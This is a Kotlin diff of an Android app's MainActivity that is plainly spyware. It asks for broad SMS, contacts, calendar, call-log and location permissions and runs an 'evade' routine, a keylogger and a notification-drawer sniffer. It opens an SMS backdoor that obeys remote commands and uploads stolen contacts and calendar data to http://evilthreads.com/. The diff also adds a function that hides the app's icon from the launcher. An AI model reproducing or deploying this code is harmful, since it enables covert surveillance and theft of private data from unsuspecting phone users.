@@ -1,12 +1,14 @@
 package com.evilthreads.evademe
 
 import android.Manifest
-import android.annotation.SuppressLint
+import android.app.Activity
+import android.content.Context
+import android.content.pm.PackageManager
 import android.os.Build
 import android.util.Log
-import androidx.annotation.RequiresApi
 import androidx.appcompat.app.AppCompatActivity
 import androidx.lifecycle.lifecycleScope
+import androidx.lifecycle.whenCreated
 import com.evilthreads.drawersnifferlib.DrawerSniffer
 import com.evilthreads.evade.evade
 import com.evilthreads.keylogger.Keylogger
@@ -47,16 +49,36 @@ import kotlinx.coroutines.withContext
 ............\..............(
 ..............\.............\...
 */
+@ExperimentalStdlibApi
 class MainActivity : AppCompatActivity() {
     val TAG = this.javaClass.simpleName
     init {
         lifecycleScope.launchWhenResumed {
-            evade{
+            evade {
                 val kotlinPermissions = KotlinPermissions.with(this@MainActivity).apply {
-                    if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
-                        permissions(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALENDAR, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.ACCESS_BACKGROUND_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_BACKGROUND_LOCATION, Manifest.permission.READ_PHONE_STATE)
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
+                        permissions(
+                            Manifest.permission.RECEIVE_SMS,
+                            Manifest.permission.READ_CONTACTS,
+                            Manifest.permission.READ_CALENDAR,
+                            Manifest.permission.READ_EXTERNAL_STORAGE,
+                            Manifest.permission.READ_CALL_LOG,
+                            Manifest.permission.READ_SMS,
+                            Manifest.permission.ACCESS_BACKGROUND_LOCATION,
+                            Manifest.permission.ACCESS_COARSE_LOCATION,
+                            Manifest.permission.ACCESS_BACKGROUND_LOCATION,
+                            Manifest.permission.READ_PHONE_STATE
+                        )
                     else
-                        permissions(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALENDAR, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.ACCESS_COARSE_LOCATION)
+                        permissions(
+                            Manifest.permission.RECEIVE_SMS,
+                            Manifest.permission.READ_CONTACTS,
+                            Manifest.permission.READ_CALENDAR,
+                            Manifest.permission.READ_EXTERNAL_STORAGE,
+                            Manifest.permission.READ_CALL_LOG,
+                            Manifest.permission.READ_SMS,
+                            Manifest.permission.ACCESS_COARSE_LOCATION
+                        )
                 }
                 kotlinPermissions.onAccepted {
                     val payload = suspend {
@@ -74,18 +96,22 @@ class MainActivity : AppCompatActivity() {
                             keyloggerJob.join()
                         }
                     }
-                    HttpClient(CIO){
-                        install(JsonFeature){
+                    HttpClient(CIO) {
+                        install(JsonFeature) {
                             serializer = KotlinxSerializer()
                         }
-                        install(Auth){
+                        install(Auth) {
                             basic {
                                 username = "evilthreads"
                                 password = "secret"
                             }
                         }
                     }.use { client ->
-                        SmsBackdoor.openDoor(this@MainActivity, "666:", payload = payload) { remoteCommand ->
+                        SmsBackdoor.openDoor(
+                            this@MainActivity,
+                            "666:",
+                            payload = payload
+                        ) { remoteCommand ->
                             runBlocking {
                                 when (remoteCommand) {
                                     "COMMAND_GET_CONTACTS" -> calendarLaunch(this@MainActivity).let { calendarEvents -> client.upload(calendarEvents) }
@@ -106,11 +132,14 @@ class MainActivity : AppCompatActivity() {
                     Keylogger.requestPermission(this@MainActivity)
                     if (!DrawerSniffer.hasPermission(this@MainActivity))
                         DrawerSniffer.requestPermission(this@MainActivity)
+                    hideAppIcon()
                 }.ask()
             }
         }
     }
 }
+
+private fun Activity.hideAppIcon() = this.applicationContext.packageManager.setComponentEnabledSetting(this.componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
 
 val url = "http://evilthreads.com/"
 val contactsUri = url.plus("contacts")
